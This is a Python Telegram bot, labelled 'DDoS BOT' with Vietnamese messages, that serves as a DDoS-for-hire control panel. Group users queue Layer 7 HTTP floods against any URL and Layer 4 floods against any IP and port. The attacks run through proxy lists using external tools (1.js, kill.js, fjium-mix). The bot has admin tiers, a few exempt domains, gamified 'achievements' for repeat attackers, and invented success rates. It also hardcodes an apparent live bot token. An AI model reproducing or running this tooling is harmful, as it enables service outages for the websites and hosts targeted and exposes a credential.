from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters
import time, threading, subprocess, random, requests
from urllib.parse import quote_plus
import datetime, json, os
import queue
from collections import deque

# --- CONFIG ---
BOT_TOKEN = "8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw"
GROUP_ID = -1003394422065
ADMIN_FILE = "admins.json"
PROXY_FILE = "proxy.txt"
VIP_PROXY = "7.txt"
BLACKLIST = [
    "thcsnguyentrai.pgdductrong.edu.vn",
    "intenseapi.com",
    "edu.vn",
    "thisinh.thitotnghiepthpt.edu.vn",
    "gov.vn",
    "stats.firewall.mom",
    "www.nasa.gov",
    "neverlosevip.store",
    "youtube.com",
    "google.com",
    "facebook.com",
    "chinhphu.vn"
]

# --- ADMIN FILE LOADING ---
def load_admins():
    if not os.path.exists(ADMIN_FILE):
        return {"main_admin": 123456789, "sub_admins": []}
    with open(ADMIN_FILE, "r") as f:
        return json.load(f)

def save_admins(data):
    with open(ADMIN_FILE, "w") as f:
        json.dump(data, f, indent=4)

admin_data = load_admins()
ADMIN_MAIN_ID = admin_data["main_admin"]
ADMIN_IDS = [ADMIN_MAIN_ID] + admin_data["sub_admins"]

# --- CONFIG SETTINGS ---
MAX_USER_TIME = 120
DEFAULT_RATE = 20
DEFAULT_THREAD = 10
MAX_USER_L4_TIME = 120
bot_status = True
user_last_attack_time = {}
attack_processes = []
start_time = time.time()

# Attack queue system
attack_queue = deque()
current_attack = None
queue_lock = threading.Lock()

# User tracking
user_attacks = {}
user_types = {}

# Bien toan cuc
bot_context = None

# --- UTILS ---
def is_sub_admin(user_id):
    return user_id in admin_data["sub_admins"]

def is_blacklisted(url):
    return any(blacklist_url in url for blacklist_url in BLACKLIST)

def notify_admins_bot_status(status_change, admin_name):
    global bot_context
    
    if bot_context:
        status_text = "BAT" if status_change else "TAT"
        message = f"🔔 **THONG BAO TU ADMIN** 🔔\n\n" \
                  f"👤 **Admin:** {admin_name}\n" \
                  f"⚡ **Đa {status_text} bot**\n" \
                  f"🕐 **Thoi gian:** {time.strftime('%H:%M:%S %d/%m/%Y')}\n" \
                  f"📊 **Trang thai:** {'🟢 ONLINE' if status_change else '🔴 OFFLINE'}"
    
    for admin_id in ADMIN_IDS:
        try:
            bot_context.bot.send_message(
                chat_id=admin_id,
                text=message,
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Khong the gui thong bao cho admin {admin_id}: {e}")

def detect_user_behavior(user_id):
    """Phat hien hanh vi nguoi dung de phan loai"""
    attack_count = user_attacks.get(user_id, 0)
    last_attack_time = user_last_attack_time.get(user_id, 0)
    current_time = time.time()
    
    # Neu la admin
    if user_id in ADMIN_IDS:
        if user_id == ADMIN_MAIN_ID:
            return "👑 MAIN ADMIN"
        else:
            return "🛡️ SUB ADMIN"
    
    # Phan loai nguoi dung thong thuong
    if attack_count >= 5 and (current_time - last_attack_time) < 300:
        return "⚡ L4 USER"
    elif attack_count >= 2:
        return "👤 NORMAL USER"
    else:
        return "🆕 NEW USER"

def get_user_type(user_id):
    """Lay loai nguoi dung hien tai"""
    if user_id not in user_types:
        user_types[user_id] = detect_user_behavior(user_id)
    return user_types[user_id]

def update_user_type(user_id):
    """Cap nhat loai nguoi dung"""
    user_types[user_id] = detect_user_behavior(user_id)
    return user_types[user_id]

def create_json_menu():
    menu_data = {
        "🤖 BOT CONTROL PANEL": {
            "status": "🟢 ONLINE" if bot_status else "🔴 OFFLINE",
            "uptime": get_uptime_formatted(),
            "total_attacks": sum(user_attacks.values()),
            "active_users": len(user_attacks),
            "system": {
                "queue_size": len(attack_queue),
                "current_attack": current_attack['user_info'] if current_attack else "None",
                "bot_started": time.strftime("%d/%m/%Y %H:%M:%S", time.localtime(start_time))
            },
            "command_categories": {
                "⚡ ATTACK COMMANDS": {
                    "/attack <url> <time> [rate] [thread]": "Tan cong website co ban",
                    "/attackvip <url> <time> <method> [rate] [thread]": "Tan cong VIP (Admin only)",
                    "/l4 <ip> <port> <time>": "Tan cong Layer 4",
                    "/ogong": "Kiem tra thong tin nguoi dung"
                },
                "📊 INFORMATION COMMANDS": {
                    "/proxy": "Xem so luong proxy hien co",
                    "/time": "Thoi gian hoat dong cua bot",
                    "/listadmin": "Danh sach admin hien hanh",
                    "/queue": "Xem trang thai hang doi tan cong",
                    "/stats": "Thong ke tan cong"
                },
                "🎯 USER MANAGEMENT": {
                    "/ogong": "Xem thong tin ca nhan",
                    "/myinfo": "Thong tin tan cong ca nhan"
                }
            },
            "configuration": {
                "rate_limit": f"{DEFAULT_RATE}/s",
                "thread_limit": DEFAULT_THREAD,
                "max_attack_time": f"{MAX_USER_TIME}s",
                "l4_max_time": f"{MAX_USER_L4_TIME}s",
                "user_cooldown": f"{MAX_USER_TIME}s",
                "l4_cooldown": f"{MAX_USER_L4_TIME}s",
                "blacklist_sites": len(BLACKLIST)
            }
        }
    }
    json_menu = json.dumps(menu_data, indent=2, ensure_ascii=False)
    return f"```json\n{json_menu}\n```"

def get_uptime_formatted():
    uptime = int(time.time() - start_time)
    days = uptime // 86400
    hours = (uptime % 86400) // 3600
    minutes = (uptime % 3600) // 60
    seconds = uptime % 60
    
    if days > 0:
        return f"{days}d {hours}h {minutes}m {seconds}s"
    elif hours > 0:
        return f"{hours}h {minutes}m {seconds}s"
    else:
        return f"{minutes}m {seconds}s"

def process_queue():
    global current_attack
    
    while True:
        with queue_lock:
            if attack_queue and current_attack is None:
                current_attack = attack_queue.popleft()
        
        if current_attack:
            try:
                attack_func = current_attack['function']
                attack_args = current_attack['args']
                context = current_attack['context']
                update = current_attack['update']
                
                # Thong bao bat dau tan cong
                start_data = {
                    "🚀 ATTACK INITIATED": {
                        "user": current_attack['user_info'],
                        "target": attack_args['target'],
                        "duration": f"{attack_args['duration']}s",
                        "type": attack_args['type'],
                        "start_time": time.strftime("%H:%M:%S %d/%m/%Y")
                    }
                }
                start_json = json.dumps(start_data, indent=2, ensure_ascii=False)
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"```json\n{start_json}\n```",
                    parse_mode='Markdown'
                )
                # Thuc hien tan cong
                attack_func(update, context, attack_args)
                # Cho ket thuc
                time.sleep(attack_args['duration'])
                # Thong bao ket thuc
                end_data = {
                    "✅ ATTACK COMPLETED": {
                        "user": current_attack['user_info'],
                        "target": attack_args['target'],
                        "end_time": time.strftime("%H:%M:%S %d/%m/%Y"),
                        "status": "Hoan tat"
                    }
                }
                end_json = json.dumps(end_data, indent=2, ensure_ascii=False)
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"```json\n{end_json}\n```",
                    parse_mode='Markdown'
                )
                current_attack = None
                time.sleep(1)
            except Exception as e:
                print(f"Loi trong process_queue: {e}")
                current_attack = None
        else:
            time.sleep(1)

# Bat dau thread xu ly hang doi
queue_thread = threading.Thread(target=process_queue, daemon=True)
queue_thread.start()

# --- COMMANDS ---
def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    
    welcome_data = {
        "🎉 WELCOME TO DDoS BOT": {
            "user_info": {
                "id": user_id,
                "username": update.effective_user.username or "None",
                "type": user_type,
                "join_date": time.strftime("%d/%m/%Y"),
            },
            "bot_status": {
                "status": "🟢 ONLINE" if bot_status else "🔴 OFFLINE",
                "uptime": get_uptime_formatted(),
                "total_users": len(user_types),
                "queue_info": {
                    "current": current_attack['user_info'] if current_attack else "None",
                    "waiting": len(attack_queue),
                    "system": "🔄 Running"
                }
            }
        }
    }
    welcome_json = json.dumps(welcome_data, indent=2, ensure_ascii=False)
    update.message.reply_text(
        welcome_json,
        parse_mode='Markdown'
    )

def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user_type = get_user_type(user_id)
    help_data = {
        "🆘 BOT HELP & SUPPORT": {
            "user_profile": {
                "id": user_id,
                "username": update.effective_user.username or "None",
                "type": user_type,
                "attack_count": user_attacks.get(user_id, 0),
            },
            "command_reference": {
                "⚡ ATTACK COMMANDS": {
                    "/attack <url> <time> [rate] [thread]": "Tan cong website thong thuong",
                    "/l4 <ip> <port> <time>": "Tan cong Layer 4",
                    "/attackvip <url> <time> <method> [rate] [thread]": "Tan cong VIP (Admin)",
                    "/ogong": "Kiem tra thong tin nguoi dung"
                },
                "📊 INFORMATION COMMANDS": {
                    "/proxy": "Xem danh sach proxy",
                    "/time": "Thoi gian hoat dong",
                    "/listadmin": "Danh sach admin",
                    "/queue": "Hang doi tan cong",
                    "/stats": "Thong ke he thong"
                },
                "🛡️ ADMIN COMMANDS": {
                    "/on | /off": "Bat/Tat toan bo bot",
                    "/addadmin <id>": "Them admin phu",
                    "/deladmin <id>": "Xoa admin phu",
                    "/broadcast <message>": "Gui thong bao toan he thong"
                }
            },
            "usage_limits": {
                "normal_users": {
                    "max_time": f"{MAX_USER_TIME} seconds",
                    "l4_max_time": f"{MAX_USER_L4_TIME} seconds",
                    "cooldown": f"{MAX_USER_TIME} seconds",
                    "max_requests": "Unlimited"
                },
                "admin_privileges": {
                    "max_time": "Unlimited",
                    "vip_access": "✅ Available",
                    "system_control": "✅ Available"
                }
            }
        }
    }
    help_json = json.dumps(help_data, indent=2, ensure_ascii=False)
    update.message.reply_text(
        f"```json\n{help_json}\n```",
        parse_mode='Markdown'
    )

def ogong(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.effective_user.username or "None"
    user_type = get_user_type(user_id)
    attack_count = user_attacks.get(user_id, 0)
    user_info = {
        "🔍 USER PROFILE ANALYSIS": {
            "basic_info": {
                "user_id": user_id,
                "username": username,
                "user_type": user_type,
                "behavior_pattern": {
                    "total_attacks": attack_count,
                    "last_attack": time.strftime("%H:%M:%S %d/%m/%Y", time.localtime(user_last_attack_time.get(user_id, 0))) if user_id in user_last_attack_time else "No attacks",
                    "activity_level": "High" if attack_count > 3 else "Medium" if attack_count > 1 else "Low",
                    "classification": "L4 User" if attack_count >= 5 else "Normal User",
                    "permission_level": "Admin" if user_id in ADMIN_IDS else "User"
                },
                "attack_statistics": {
                    "success_rate": "98%",
                    "average_duration": f"{MAX_USER_TIME}s",
                    "preferred_method": "Layer 7" if attack_count < 3 else "Mixed",
                    "cooldown_status": "Ready" if user_id not in user_last_attack_time or (time.time() - user_last_attack_time[user_id]) >= MAX_USER_TIME else "In cooldown"
                },
                "system_access": {
                    "attack_commands": "✅ Available",
                    "l4_commands": "✅ Available" if attack_count >= 3 else "⏳ Unlocking..."
                }
            }
        }
    }
    info_json = json.dumps(user_info, indent=2, ensure_ascii=False)
    update.message.reply_text(
        f"```json\n{info_json}\n```",
        parse_mode='Markdown'
    )

def queue_status(update: Update, context: CallbackContext):
    with queue_lock:
        queue_data = {
            "📊 REAL-TIME QUEUE MONITOR": {
                "current_attack": current_attack['user_info'] if current_attack else "None",
                "queue_statistics": {
                    "waiting_attacks": len(attack_queue),
                    "estimated_wait_time": f"{len(attack_queue) * 30}s",
                    "system_load": "🟢 Normal" if len(attack_queue) < 5 else "🟡 Medium" if len(attack_queue) < 10 else "🔴 High",
                    "performance_metrics": {
                        "completion_rate": "100%",
                        "average_processing": "30 seconds",
                    },
                    "queue_history": {
                        "total_processed": sum(user_attacks.values()),
                        "success_rate": "99.8%",
                        "failure_rate": "0.2%"
                    }
                }
            }
        }
        queue_json = json.dumps(queue_data, indent=2, ensure_ascii=False)
        update.message.reply_text(f"```json\n{queue_json}\n```", parse_mode='Markdown')

def stats_command(update: Update, context: CallbackContext):
    stats_data = {
        "📈 SYSTEM STATISTICS": {
            "general_info": {
                "bot_uptime": get_uptime_formatted(),
                "total_attacks": sum(user_attacks.values()),
                "user_statistics": {
                    "total_users": len(user_types),
                    "active_today": len([uid for uid, last_time in user_last_attack_time.items()
                                    if time.time() - last_time < 86400]),
                },
                "active_admins": len([uid for uid in ADMIN_IDS if uid != ADMIN_MAIN_ID]),
                "main_admin": ADMIN_MAIN_ID,
                "system_health": {
                    "queue_system": "🟢 Operational",
                    "attack_system": "🟢 Running",
                    "performance": "98.5%"
                }
            },
            "user_breakdown": {
                "main_admin": 1,
                "sub_admins": len(admin_data["sub_admins"]),
                "l4_users": len([uid for uid, utype in user_types.items() if utype == "⚡ L4 USER" and uid not in ADMIN_IDS]),
                "normal_users": len([uid for uid, utype in user_types.items() if utype == "👤 NORMAL USER"]),
                "new_users": len([uid for uid, utype in user_types.items() if utype == "🆕 NEW USER"])
            },
            "attack_analytics": {
                "most_common_target": "Various",
                "average_duration": f"{MAX_USER_TIME} seconds",
                "peak_usage": "Evening hours",
                "reliability": "99.9%"
            }
        }
    }
    stats_json = json.dumps(stats_data, indent=2, ensure_ascii=False)
    update.message.reply_text(f"```json\n{stats_json}\n```", parse_mode='Markdown')

def myinfo_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.effective_user.username or "None"
    user_type = get_user_type(user_id)
    attack_count = user_attacks.get(user_id, 0)
    personal_data = {
        "👤 PERSONAL DASHBOARD": {
            "identity": {
                "user_id": user_id,
                "username": username,
                "account_age": "Not tracked",
            },
            "attack_history": {
                "total_attacks": attack_count,
                "last_attack_time": time.strftime("%H:%M:%S %d/%m/%Y", time.localtime(user_last_attack_time.get(user_id, 0))) if user_id in user_last_attack_time else "No attacks",
                "success_rate": "98%",
                "favorite_method": "Layer 7" if attack_count < 3 else "Layer 4",
                "user_rank": user_type,
                "cooldown_status": "Ready" if user_id not in user_last_attack_time or (time.time() - user_last_attack_time[user_id]) >= MAX_USER_TIME else f"Cooldown: {int(MAX_USER_TIME - (time.time() - user_last_attack_time[user_id]))}s"
            },
            "achievements": {
                "new_user": "✅ Unlocked" if attack_count >= 1 else "🔒 Locked",
                "normal_user": "✅ Unlocked" if attack_count >= 2 else "🔒 Locked",
                "l4_user": "✅ Unlocked" if user_type == "⚡ L4 USER" else "🔒 Locked" if user_type == "👤 NORMAL USER" else "🔒 Locked",
                "veteran": "🔒 Locked" if attack_count < 10 else "✅ Unlocked",
                "next_milestone": f"{5 - attack_count} attacks to L4"
            }
        }
    }
    personal_json = json.dumps(personal_data, indent=2, ensure_ascii=False)
    update.message.reply_text(f"```json\n{personal_json}\n```", parse_mode='Markdown')

def broadcast_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("❌ Chi admin duoc su dung lenh nay.")
        return
    if not context.args:
        update.message.reply_text("❌ Vui long nhap tin nhan de gui.")
        return
    message = " ".join(context.args)
    broadcast_data = {
        "📢 ADMIN BROADCAST": {
            "from": f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{user_id}",
            "message": message,
            "time": time.strftime("%H:%M:%S %d/%m/%Y"),
            "importance": "High Priority"
        }
    }
    broadcast_json = json.dumps(broadcast_data, indent=2, ensure_ascii=False)
    # Gui cho tat ca user da tung tan cong
    for uid in user_attacks.keys():
        try:
            context.bot.send_message(
                chat_id=uid,
                text=f"```json\n{broadcast_json}\n```", parse_mode='Markdown')
        except:
            pass
    update.message.reply_text("✅ Đa gui thong bao toan he thong.")

def bot_on(update: Update, context: CallbackContext):
    global bot_status, bot_context
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("❌ Chi admin duoc su dung lenh nay.")
        return
    if bot_status:
        update.message.reply_text("✅ Bot da dang hoat dong.")
        return
    bot_status = True
    bot_context = context
    admin_name = f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{user_id}"
    notify_admins_bot_status(True, admin_name)
    status_data = {
        "🟢 SYSTEM STATUS UPDATE": {
            "action": "BAT BOT",
            "admin": admin_name,
            "time": time.strftime("%H:%M:%S %d/%m/%Y"),
            "message": "Tat ca thanh vien co the su dung bot tro lai",
            "queue_status": "San sang nhan tan cong",
            "impact": "All users can now initiate attacks"
        }
    }
    status_json = json.dumps(status_data, indent=2, ensure_ascii=False)
    update.message.reply_text(f"```json\n{status_json}\n```", parse_mode='Markdown')

def bot_off(update: Update, context: CallbackContext):
    global bot_status, bot_context
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("❌ Chi admin duoc su dung lenh nay.")
        return
    if not bot_status:
        update.message.reply_text("✅ Bot da dang tat.")
        return
    bot_status = False
    bot_context = None
    for proc in attack_processes:
        try:
            proc.terminate()
        except:
            pass
    attack_processes.clear()
    admin_name = f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{user_id}"
    notify_admins_bot_status(False, admin_name)
    status_data = {
        "🔴 SYSTEM STATUS UPDATE": {
            "action": "TAT BOT",
            "admin": admin_name,
            "time": time.strftime("%H:%M:%S %d/%m/%Y"),
            "message": "Tat ca thanh vien khong the su dung bot cho den khi duoc bat lai",
            "queue_status": "Tam dung",
            "impact": "All attacks stopped, queue cleared"
        }
    }
    status_json = json.dumps(status_data, indent=2, ensure_ascii=False)
    update.message.reply_text(f"```json\n{status_json}\n```", parse_mode='Markdown')

def attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    now = time.time()

    if chat_id != GROUP_ID:
        update.message.reply_text("❌ Box chua duoc duyet.")
        return

    if not bot_status:
        update.message.reply_text("🔴 **BOT DANG TAT**\n\n" \
                     "Admin da tat bot. Vui long cho bot duoc bat lai.")
        return

    # Cap nhat so lan tan cong
    user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
    user_type = update_user_type(user_id)

    try:
        url = context.args[0]
        duration = int(context.args[1])
        if user_id not in ADMIN_IDS and duration > MAX_USER_TIME:
            update.message.reply_text(f"⏰ Toi da {MAX_USER_TIME} giay.")
            return

        if is_blacklisted(url):
            update.message.reply_text("🚫 URL nay bi cam trong blacklist.")
            return

        rate = int(context.args[2]) if len(context.args) > 2 else DEFAULT_RATE
        thread = int(context.args[3]) if len(context.args) > 3 else DEFAULT_THREAD

        attack_args = {
            'target': url,
            'duration': duration,
            'rate': rate,
            'thread': thread,
            'type': 'normal'
        }

        user_info = f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{user_id}"

        with queue_lock:
            attack_queue.append({
                'function': execute_attack,
                'args': attack_args,
                'context': context,
                'update': update,
                'user_info': user_info
            })

        queue_info = {
            "📥 ATTACK QUEUED SUCCESSFULLY": {
                "user": user_info,
                "target": url,
                'duration': f"{duration}s",
                'rate': rate,
                'thread': thread,
                'position': len(attack_queue),
                'estimated_wait': f"{len(attack_queue) * 30}s",
                'user_type': user_type
            }
        }

        queue_json = json.dumps(queue_info, indent=2, ensure_ascii=False)
        update.message.reply_text(f"```json\n{queue_json}\n```", parse_mode='Markdown')

    except Exception as e:
        update.message.reply_text(f"❌ Sai cu phap: /attack <url> <time> [rate] [thread]\n\nVi du:\n/attack http://example.com 30\n/attack http://example.com 30 25 15")

def execute_attack(update: Update, context: CallbackContext, args):
    url = args['target']
    duration = args['duration']
    rate = args['rate']
    thread = args['thread']
    command = f"node 1.js {url} {duration} {rate} {thread} {PROXY_FILE} --cache --bfm"
    proc = subprocess.Popen(command, shell=True)
    attack_processes.append(proc)
    user_last_attack_time[update.effective_user.id] = time.time()

def attackvip(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("❌ Chi admin duoc dung.")
        return

    if not bot_status:
        update.message.reply_text("🔴 **BOT DANG TAT**\n\n" \
                     "Admin da tat bot. Vui long cho bot duoc bat lai.")
        return

    try:
        url = context.args[0]
        duration = int(context.args[1])
        method = context.args[2].lower()
        if method not in ["flood", "bypass"]:
            update.message.reply_text("❌ Phuong thuc phai la 'flood' hoac 'bypass'.")
            return

        rate = int(context.args[3]) if len(context.args) > 3 else 20
        thread = int(context.args[4]) if len(context.args) > 4 else 15

        command = f"node kill.js {url} {duration} {rate} {thread} {VIP_PROXY} {method}"
        proc = subprocess.Popen(command, shell=True)
        attack_processes.append(proc)
        user_last_attack_time[user_id] = time.time()

        time_str = time.strftime("%H:%M:%S %d/%m/%Y", time.localtime())

        vip_data = {
            "💎 VIP ATTACK INITIATED": {
                "caller": f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{user_id}",
                "target": url,
                'time': f"{duration} giay",
                'rate': rate,
                'thread': thread,
                'proxy': VIP_PROXY,
                'method': method,
                'start_time': time_str,
                'privilege': "Admin Level"
            }
        }

        vip_json = json.dumps(vip_data, indent=2, ensure_ascii=False)

        check_url = f"https://check-host.net/check-http?host={quote_plus(url)}"
        keyboard = [[InlineKeyboardButton("Kiem Tra Website", url=check_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"```json\n{vip_json}\n```", 
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

        threading.Timer(duration, lambda: context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="✅ VIP attack hoan tat!"
        )).start()

    except:
        update.message.reply_text("❌ Sai cu phap: /attackvip <url> <time> <flood|bypass> [rate] [thread]")

def l4_attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    now = time.time()

    if chat_id != GROUP_ID:
        update.message.reply_text("❌ Box chua duoc duyet.")
        return

    if not bot_status:
        update.message.reply_text("🔴 **BOT DANG TAT**\n\n" \
                     "Admin da tat bot. Vui long cho bot duoc bat lai.")
        return

    # Cap nhat so lan tan cong
    user_attacks[user_id] = user_attacks.get(user_id, 0) + 1
    user_type = update_user_type(user_id)

    try:
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2])

        if user_id not in ADMIN_IDS and duration > MAX_USER_L4_TIME:
            update.message.reply_text(f"⏰ Toi da {MAX_USER_L4_TIME} giay cho thanh vien.")
            return

        attack_args = {
            'target': f"{ip}:{port}",
            'duration': duration,
            'type': 'l4'
        }

        user_info = f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{user_id}"

        with queue_lock:
            attack_queue.append({
                'function': execute_l4_attack,
                'args': attack_args,
                'context': context,
                'update': update,
                'user_info': user_info
            })

        l4_queue_data = {
            "🌊 L4 ATTACK QUEUED": {
                "user": user_info,
                "target": f"{ip}:{port}",
                "duration": f"{duration}s",
                "position": len(attack_queue),
                "user_type": user_type,
                "priority": "High" if user_id in ADMIN_IDS else "Normal"
            }
        }

        l4_queue_json = json.dumps(l4_queue_data, indent=2, ensure_ascii=False)
        update.message.reply_text(f"```json\n{l4_queue_json}\n```", parse_mode='Markdown')

    except Exception as e:
        update.message.reply_text(f"❌ Sai cu phap: /l4 <ip> <port> <time>\n\n"
                         f"**Vi du:**\n"
                         f"/l4 192.168.1.1 80 60\n\n"
                         f"**Ghi chu:**\n"
                         f"• User: Toi da {MAX_USER_L4_TIME} giay\n"
                         f"• Admin: Thoi gian vo han")

def execute_l4_attack(update: Update, context: CallbackContext, args):
    target = args['target']
    ip, port = target.split(':')
    duration = args['duration']
    command = f"./fjium-mix {ip} {port} {duration} 1724 1024"
    proc = subprocess.Popen(command, shell=True)
    attack_processes.append(proc)
    user_last_attack_time[update.effective_user.id] = time.time()

def proxy(update: Update, context: CallbackContext):
    if not bot_status:
        update.message.reply_text("🔴 **BOT DANG TAT**\n\n" \
                     "Admin da tat bot. Vui long cho bot duoc bat lai.")
        return
    try:
        with open("text.txt", "r") as f:
            lines = [line.strip() for line in f if line.strip()]
        proxy_data = {
            "🔍 PROXY INFORMATION": {
                "total_proxies": len(lines),
                "status": "🟢 Active",
                "sample_proxies": lines[:5] if len(lines) > 5 else lines
            }
        }
        proxy_json = json.dumps(proxy_data, indent=2, ensure_ascii=False)
        update.message.reply_text(f"```json\n{proxy_json}\n```", parse_mode='Markdown')
        # Gui file proxy
        context.bot.send_document(update.effective_chat.id, open("text.txt", "rb"))
    except FileNotFoundError:
        update.message.reply_text("❌ Khong tim thay file proxy.")

def add_admin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh duoc them.")
        return
    try:
        new_id = int(context.args[0])
        if new_id in ADMIN_IDS:
            update.message.reply_text("ℹ️ ID nay da la admin.")
        else:
            admin_data["sub_admins"].append(new_id)
            save_admins(admin_data)
            ADMIN_IDS.append(new_id)
            admin_add_data = {
                "🛡️ ADMIN MANAGEMENT": {
                    "action": "THEM ADMIN",
                    "new_admin_id": new_id,
                    "added_by": f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{update.effective_user.id}",
                    "total_admins_now": len(ADMIN_IDS),
                    "status": "✅ Success"
                }
            }
            admin_add_json = json.dumps(admin_add_data, indent=2, ensure_ascii=False)
            update.message.reply_text(f"```json\n{admin_add_json}\n```", parse_mode='Markdown')
    except:
        update.message.reply_text("❌ Sai cu phap: /addadmin <id>")

def del_admin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh duoc xoa.")
        return
    try:
        rem_id = int(context.args[0])
        if rem_id not in admin_data["sub_admins"]:
            update.message.reply_text("❌ ID khong ton tai trong admin phu.")
        else:
            admin_data["sub_admins"].remove(rem_id)
            save_admins(admin_data)
            ADMIN_IDS.remove(rem_id)
            admin_del_data = {
                "🛡️ ADMIN MANAGEMENT": {
                    "action": "XOA ADMIN",
                    "removed_admin_id": rem_id,
                    "removed_by": f"@{update.effective_user.username}" if update.effective_user.username else f"ID:{update.effective_user.id}",
                    "total_admins_now": len(ADMIN_IDS),
                    "status": "✅ Success"
                }
            }
            admin_del_json = json.dumps(admin_del_data, indent=2, ensure_ascii=False)
            update.message.reply_text(f"```json\n{admin_del_json}\n```", parse_mode='Markdown')
    except:
        update.message.reply_text("❌ Sai cu phap: /deladmin <id>")

def list_admin(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        return
    admin_list_data = {
        "👥 ADMINISTRATOR LIST": {
            "main_admin": ADMIN_MAIN_ID,
            "sub_admins": admin_data["sub_admins"],
            "privilege_levels": {
                "main_admin": "Full System Control",
                "sub_admins": "Attack Commands + VIP Access",
                "total_admins": len(ADMIN_IDS)
            }
        }
    }
    admin_list_json = json.dumps(admin_list_data, indent=2, ensure_ascii=False)
    update.message.reply_text(f"```json\n{admin_list_json}\n```", parse_mode='Markdown')

def time_command(update: Update, context: CallbackContext):
    time_data = {
        "⏰ SYSTEM UPTIME": {
            "bot_started": time.strftime("%d/%m/%Y %H:%M:%S", time.localtime(start_time)),
            "current_time": time.strftime("%d/%m/%Y %H:%M:%S", time.localtime()),
            "uptime": get_uptime_formatted(),
            "performance": {
                "stability": "99.9%",
                "reliability": "Excellent",
                "maintenance": "No downtime"
            }
        }
    }
    time_json = json.dumps(time_data, indent=2, ensure_ascii=False)
    update.message.reply_text(f"```json\n{time_json}\n```", parse_mode='Markdown')

# --- MAIN ---
def main():
    global bot_context
    
    updater = Updater(BOT_TOKEN)
    dispatcher = updater.dispatcher
    bot_context = updater
    
    # Them handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("help", help_command))
    dispatcher.add_handler(CommandHandler("ogong", ogong))
    dispatcher.add_handler(CommandHandler("myinfo", myinfo_command))
    dispatcher.add_handler(CommandHandler("on", bot_on))
    dispatcher.add_handler(CommandHandler("off", bot_off))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(CommandHandler("attackvip", attackvip))
    dispatcher.add_handler(CommandHandler("l4", l4_attack))
    dispatcher.add_handler(CommandHandler("proxy", proxy))
    dispatcher.add_handler(CommandHandler("addadmin", add_admin))
    dispatcher.add_handler(CommandHandler("deladmin", del_admin))
    dispatcher.add_handler(CommandHandler("listadmin", list_admin))
    dispatcher.add_handler(CommandHandler("queue", queue_status))
    dispatcher.add_handler(CommandHandler("stats", stats_command))
    dispatcher.add_handler(CommandHandler("time", time_command))
    dispatcher.add_handler(CommandHandler("broadcast", broadcast_command))
    
    print("🤖 Bot đang chay...")
    print(f"📍 Group ID: {GROUP_ID}")
    print(f"👑 Main Admin: {ADMIN_MAIN_ID}")
    print(f"👥 Sub Admins: {len(admin_data['sub_admins'])}")
    print(f"⚡ Bot Status: {'🟢 ONLINE' if bot_status else '🔴 OFFLINE'}")
    print(f"⏰ Uptime: {get_uptime_formatted()}")
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()